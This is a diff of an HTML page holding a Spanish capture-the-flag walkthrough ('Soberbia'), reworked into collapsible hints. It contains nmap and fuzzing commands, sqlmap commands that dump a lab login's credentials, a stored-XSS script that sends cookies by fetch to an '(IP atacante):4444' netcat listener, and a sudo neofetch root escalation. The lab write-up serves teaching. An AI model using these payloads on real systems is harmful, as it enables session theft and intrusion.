@@ -440,7 +440,6 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <h1>Soberbia</h1>
 <div class="details">
 <span id="author" class="author">Manuel L. Quero</span><br>
-<span id="revdate">2025-05-02</span>
 </div>
 <div id="toc" class="toc2">
 <div id="toctitle">Table of Contents</div>
@@ -504,20 +503,21 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <div class="sect2">
 <h3 id="_reconocimiento">Reconocimiento</h3>
 <div class="sect3">
-<h4 id="_nmap">Nmap</h4>
+<h4 id="_fase_1">Fase 1</h4>
 <div class="paragraph">
-<p>Empezaremos conociendo los puertos que tiene abiertos el servidor. Para ello haremos uso primeramente de <a href="https://nmap.org/man/es/index.html">nmap</a>.</p>
+<p>Empezaremos conociendo los puertos que tiene abiertos el servidor.</p>
 </div>
 <details>
-<summary class="title">Nmap Recon</summary>
+<summary class="title">Pista 1</summary>
 <div class="content">
+<div class="paragraph">
+<p>Para ello haremos uso primeramente de <a href="https://nmap.org/man/es/index.html">nmap</a>.</p>
+</div>
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn (IP) -oG allPorts</code></pre>
 </div>
 </div>
-</div>
-</details>
 <div class="ulist">
 <ul>
 <li>
@@ -555,24 +555,27 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/nmap/nmap.png" alt="nmap">
 </div>
 </div>
 <div class="paragraph">
-<p>Como podemos ver están abiertos los puertos 80 y 22, podemos ver sus versiones con el siguiente comando:</p>
+<p>Como podemos ver están abiertos los puertos 80 y 22</p>
 </div>
+</div>
+</details>
 <details>
-<summary class="title">Nmap Versiones</summary>
+<summary class="title">Pista 2</summary>
 <div class="content">
+<div class="paragraph">
+<p>Podemos ver sus versiones con el siguiente comando:</p>
+</div>
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">nmap -p (PORTS) -sC -sV (IP)</code></pre>
 </div>
 </div>
-</div>
-</details>
 <div class="ulist">
 <ul>
 <li>
@@ -589,15 +592,23 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/nmap/nmapVer.png" alt="Versiones nmap">
 </div>
 </div>
 <div class="paragraph">
-<p>Una vez identificadas las versiones de los servicios, podemos comprobar si están desactualizadas y si presentan vulnerabilidades conocidas (CVEs) que podamos explotar. Generalmente, los exploits se encuentran en repositorios como GitHub o en bases de datos especializadas como Exploit-DB. Para facilitar esta búsqueda, podemos utilizar herramientas como <strong><a href="https://www.exploit-db.com/searchsploit">searchsploit</a></strong>, que permite consultar Exploit-DB desde la terminal y verificar si existen exploits públicos para una versión específica.</p>
+<p>Una vez identificadas las versiones de los servicios, podemos comprobar si están desactualizadas y si presentan vulnerabilidades conocidas (CVEs) que podamos explotar.</p>
 </div>
-<div class="imageblock">
+</div>
+</details>
+<details>
+<summary class="title">Sugerencia</summary>
+<div class="content">
+<div class="paragraph">
+<p>Generalmente, los exploits se encuentran en repositorios como GitHub o en bases de datos especializadas como Exploit-DB. Para facilitar esta búsqueda, podemos utilizar herramientas como <strong><a href="https://www.exploit-db.com/searchsploit">searchsploit</a></strong>, que permite consultar Exploit-DB desde la terminal y verificar si existen exploits públicos para una versión específica.</p>
+</div>
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/nmap/searchsploit.png" alt="searchsploit">
 </div>
@@ -606,29 +617,29 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <p>Podemos observar que no se ha encontrado ningún exploit relevante en Exploit-DB. Es importante ser precisos con los términos de búsqueda, ya que searchsploit devuelve todos los resultados relacionados, aunque no estén directamente vinculados con nuestros servicios. Por este motivo puede aparecer algún resultado, pero no necesariamente se aplica a nuestro caso.</p>
 </div>
 </div>
+</details>
+</div>
 <div class="sect3">
-<h4 id="_fuzzing">Fuzzing</h4>
+<h4 id="_fase_2">Fase 2</h4>
 <div class="paragraph">
 <p>Cómo ya hemos podido conocer, se trata de una página web sin certificado y con una conexión ssh, por lo que vamos a empezar analizando la página.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/fuzz/pagina.png" alt="pagina login">
 </div>
 </div>
+<details>
+<summary class="title">Pista 3</summary>
+<div class="content">
 <div class="paragraph">
 <p>Aparentemente se ve una página que no tiene nada, pero es muy posible que posea directorios y subdirectorios con archivos. Para conocer la estructura vamos hacer lo que se denomina como fuzzing de contenido, es muy útil para identificar rutas sensibles como /admin, /backup, /config.php, etc. En nuestro caso usaremos <a href="https://www.kali.org/tools/feroxbuster/">feroxbuster</a> y <a href="https://www.kali.org/tools/gobuster/">gobuster</a>, y compararemos.</p>
 </div>
-<details>
-<summary class="title">Feroxbuster</summary>
-<div class="content">
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">feroxbuster -u http://(IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --depth 0 --timeout 5</code></pre>
 </div>
 </div>
-</div>
-</details>
 <div class="ulist">
 <ul>
 <li>
@@ -645,21 +656,21 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/fuzz/feroxbuster.png" alt="feroxbuster">
 </div>
 </div>
+</div>
+</details>
 <details>
-<summary class="title">Gobuster</summary>
+<summary class="title">Pista 4</summary>
 <div class="content">
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">gobuster dir -u (IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
 </div>
 </div>
-</div>
-</details>
 <div class="ulist">
 <ul>
 <li>
@@ -676,64 +687,77 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <div class="paragraph">
 <p>Gobuster es bastante sencillo de usar, pero un defecto que tiene es que no permite recursividad, teniendo que usar scripts para que haga dicha recursividad. Sinceramente veo feroxuster como una mejora de este.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/fuzz/gobuster.png" alt="gobuster">
 </div>
 </div>
 </div>
+</details>
+</div>
 <div class="sect3">
-<h4 id="_analisis_web">Analisis Web</h4>
+<h4 id="_fase_3">Fase 3</h4>
+<details>
+<summary class="title">Pista 5</summary>
+<div class="content">
 <div class="paragraph">
 <p>Bueno, una vez conociendo la estructura, podemos apreciar que hay un directorio en /dev, que se llama pruebas, o un alias de esta ruta que es /devzone. Esto nos sugiere que los desarrolladores podrían estar utilizando esta ruta para realizar pruebas antes de lanzar la versión final del sitio web. Es común que estas zonas contengan código en desarrollo o funcionalidades no protegidas, lo que podría representar una posible vía de explotación.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/web/pruebas.png" alt="directorio pruebas">
 </div>
 </div>
+</div>
+</details>
+<details>
+<summary class="title">Pista 6</summary>
+<div class="content">
 <div class="paragraph">
 <p>Dentro de login.php podemos analizar las tecnologías con <strong>wappalyzer</strong> o con <strong>whatweb</strong> y ver que tecnologías usa.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/web/wappalyzer.png" alt="wappalyzer">
 </div>
 </div>
+</div>
+</details>
 <details>
-<summary class="title">Whatweb</summary>
+<summary class="title">Pista 7</summary>
 <div class="content">
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">whatweb -a 3 -v http://172.17.0.2/1/2/4/23/dev/pruebas/login.php</code></pre>
 </div>
 </div>
-</div>
-</details>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/recon/web/whatweb.png" alt="whatweb">
 </div>
 </div>
 </div>
+</details>
+</div>
 </div>
 <div class="sect2">
 <h3 id="_ataque">Ataque</h3>
 <div class="sect3">
-<h4 id="_sqli">SQLI</h4>
+<h4 id="_fase_4">Fase 4</h4>
 <div class="paragraph">
-<p>Conociendo un poco más a lo que nos enfrentamos, al ser un login podemos probar con sql, pero esta vez no lo vamos a hacer manual, obviamente hay formas más eficientes cómo <strong>sqlmap</strong>, donde comenzaremos por un reconocimiento sabiendo si es vulnerable a SQLi.</p>
+<p>Conociendo un poco más a lo que nos enfrentamos, al ser un login podemos probar con ciertos vectores.</p>
 </div>
 <details>
-<summary class="title">Sqlmap Recon</summary>
+<summary class="title">Pista 8</summary>
 <div class="content">
+<div class="paragraph">
+<p>Efectivamente con SQLi, pero esta vez no lo vamos a hacer manual, obviamente hay formas más eficientes cómo <strong>sqlmap</strong>, donde comenzaremos por un reconocimiento sabiendo si es vulnerable a SQLi.</p>
+</div>
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=admin&amp;password=admin" --batch --risk=3 --level=5 --technique=BEUSTQ</code></pre>
 </div>
 </div>
-</div>
-</details>
 <div class="ulist">
 <ul>
 <li>
@@ -778,7 +802,7 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/sqli/sqlmap.png" alt="sqlmap recon">
 </div>
@@ -786,16 +810,16 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <div class="paragraph">
 <p>Cómo podemos ver el parametro usuario es vulnerable, además más abajo se especifica la versión de Mariadb. Ahora vamos a atacar y obtener las credenciales.</p>
 </div>
+</div>
+</details>
 <details>
-<summary class="title">Sqlmap Ataque</summary>
+<summary class="title">Pista 9</summary>
 <div class="content">
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-bash" data-lang="bash">sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=admin&amp;password=admin" --dump --batch</code></pre>
 </div>
 </div>
-</div>
-</details>
 <div class="ulist">
 <ul>
 <li>
@@ -812,7 +836,7 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/sqli/sqliattack.png" alt="ataque sqli">
 </div>
@@ -821,48 +845,58 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <p>Como podemos ver, hemos obtenido las credenciales de los usuarios admin y test, por lo que podremos pasar el login.</p>
 </div>
 </div>
-<div class="sect3">
-<h4 id="_cookies">Cookies</h4>
-<div class="paragraph">
-<p>Una vez en comentarios, podemos probar cómo funciona el sistema, enviamos un mensaje y nos lo devuelve. Esto nos puede recordar al XSS que hicimos, asi que podemos obtener las cookies por <strong>netcat</strong> o mirar en Storage al F12.</p>
+</details>
 </div>
-<div class="imageblock">
+<div class="sect3">
+<h4 id="_fase_5">Fase 5</h4>
+<div class="paragraph">
+<p>Una vez en comentarios, podemos probar cómo funciona el sistema, enviamos un mensaje y nos lo devuelve. Esto nos puede recordar a primeros vectores que aprendimos.</p>
+</div>
+<details>
+<summary class="title">Pista 10</summary>
+<div class="content">
+<div class="paragraph">
+<p>Podemos hacer un ataque XSS almacenado, asi que podemos obtener las cookies por <strong>netcat</strong> o mirar en Storage al F12.</p>
+</div>
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/comentarios.png" alt="página comentarios">
 </div>
 </div>
-<div class="paragraph">
-<p>Mediante el comando <strong>nc</strong> nos podemos conectar a los puertos TCP/UDP de un host. De este modo podemos conectarnos a otros servidores usando diferentes protocolos de red. Además, también es posible crear servidores que se mantengan a la escucha de peticiones entrantes. Los puertos se abrirán por defecto mediante el protocolo TCP, aunque también se acepta el protocolo UDP. En nuestro caso, abrimos un puerto poco frecuenta para recibir los datos, la primera vez que hicimos XSS creamos nuestro propio netcat.</p>
 </div>
+</details>
 <details>
-<summary class="title">NetCat</summary>
+<summary class="title">Pista 11</summary>
 <div class="content">
 <div class="listingblock">
 <div class="content">
-<pre class="highlight"><code class="language-bash" data-lang="bash">nc -lvpn 4444</code></pre>
+<pre class="highlight"><code class="language-bash" data-lang="bash">Mediante el comando *nc* nos podemos conectar a los puertos TCP/UDP de un host. De este modo podemos conectarnos a otros servidores usando diferentes protocolos de red. Además, también es posible crear servidores que se mantengan a la escucha de peticiones entrantes. Los puertos se abrirán por defecto mediante el protocolo TCP, aunque también se acepta el protocolo UDP. En nuestro caso, abrimos un puerto poco frecuenta para recibir los datos, la primera vez que hicimos XSS creamos nuestro propio netcat.</code></pre>
 </div>
 </div>
+<div class="listingblock">
+<div class="content">
+<pre>nc -lvpn 4444</pre>
 </div>
-</details>
-<div class="imageblock">
+</div>
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/netcat1.png" alt="comando netcat">
 </div>
 </div>
+</div>
+</details>
+<details>
+<summary class="title">Pista 12</summary>
+<div class="content">
 <div class="paragraph">
 <p>Después, dentro del comentario meteremos el siguiente script en javascript, que nos pasará las cookies del usuario actual.</p>
 </div>
-<details>
-<summary class="title">XSS página</summary>
-<div class="content">
 <div class="listingblock">
 <div class="content">
 <pre class="highlight"><code class="language-javascript" data-lang="javascript">&lt;script&gt;fetch('http://(IP atacante):4444?cookie=' + encodeURIComponent(document.cookie));&lt;/script&gt;</code></pre>
 </div>
 </div>
-</div>
-</details>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/xss.png" alt="xss script">
 </div>
@@ -870,21 +904,31 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <div class="paragraph">
 <p>Una vez enviado dicho script veremos una cadena muy larga en GET, ese es el contenido de la cookie:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/netcat2.png" alt="envio de cookies a netcat">
 </div>
 </div>
+</div>
+</details>
+<details>
+<summary class="title">Pista 13</summary>
+<div class="content">
 <div class="paragraph">
 <p>Copiamos esta cadena y la decodificamos con <strong>cyberchef</strong>, una herramienta web muy util para estos casos. Usamos URL decode, para ver el contenido:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/cyberchef.png" alt="cyberchef">
 </div>
 </div>
+</div>
+</details>
+<details>
+<summary class="title">Pista 14</summary>
+<div class="content">
 <div class="paragraph">
-<p>Podemos ver que se almacenan las credenciales de ssh, han puesto el usuario y la contraseña hasheada separada por dos puntos. Para crackear hash podemos usar Crackstation:</p>
+<p>Podemos ver que se almacenan las credenciales de ssh, han puesto el usuario y la contraseña hasheada separada por dos puntos. Para crackear hash podemos usar <strong>Crackstation</strong>:</p>
 </div>
 <div class="ulist">
 <ul>
@@ -893,7 +937,7 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/CrackUser.png" alt="nombre usuario">
 </div>
@@ -905,54 +949,79 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/CrackPasswd.png" alt="contraseña">
 </div>
 </div>
 <div class="paragraph">
-<p>Una vez hecho esto ya tendríamos las credenciales del ssh. Pero también hay otra forma más sencilla de obtener las cookies, simplemente quería mostrar otra forma para hacer XSS y usar netcat. Le damos a F12 en la página y nos vamos a Storage, ahí podremos obtener los hashes que hemos crackeado antes.</p>
+<p>Una vez hecho esto ya tendríamos las credenciales del ssh.</p>
 </div>
-<div class="imageblock">
+</div>
+</details>
+<details>
+<summary class="title">Sugerencia</summary>
+<div class="content">
+<div class="paragraph">
+<p>También hay otra forma más sencilla de obtener las cookies, simplemente quería mostrar otra forma para hacer XSS y usar netcat. Le damos a F12 en la página y nos vamos a Storage, ahí podremos obtener los hashes que hemos crackeado antes.</p>
+</div>
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/xss/F12.png" alt="inspeccionar">
 </div>
 </div>
 </div>
+</details>
+</div>
 <div class="sect3">
-<h4 id="_ssh_y_escalada_de_privilegios">SSH y escalada de privilegios</h4>
+<h4 id="_fase_6">Fase 6</h4>
 <div class="paragraph">
 <p>Con las credeciales ssh, nos conectamos al servidor:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/escalada/ssh.png" alt="conexión con el servidor">
 </div>
 </div>
+<details>
+<summary class="title">Pista 15</summary>
+<div class="content">
 <div class="paragraph">
 <p>Ahora veremos si tenemos algún privilegio:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/escalada/sudo-l.png" alt="comando sudo -l">
 </div>
 </div>
+</div>
+</details>
+<details>
+<summary class="title">Pista 16</summary>
+<div class="content">
 <div class="paragraph">
 <p>Podemos ver que tenemos permisos de administración en neofetch. Por lo que buscamos en <a href="https://gtfobins.github.io/gtfobins/neofetch/">GTFOBins</a> si podemos escalar a través de él.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/escalada/gtfobins.png" alt="gtfobins">
 </div>
 </div>
+</div>
+</details>
+<details>
+<summary class="title">Pista 17</summary>
+<div class="content">
 <div class="paragraph">
 <p>Podemos ver que, para escalar privilegios, debemos crear un archivo temporal con el contenido exec /bin/sh y pasarlo como configuración a neofetch, ejecutado con sudo. Dicho esto, copiamos y pegamos lo que nos indica y obtenemos privilegios de root.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/atacar/escalada/root.png" alt="somos root">
 </div>
 </div>
+</div>
+</details>
 <div style="page-break-after: always;"></div>
 </div>
 </div>
@@ -1022,7 +1091,7 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2025-05-02 15:39:40 UTC
+Last updated 2025-05-05 18:31:57 UTC
 </div>
 </div>
 </body>
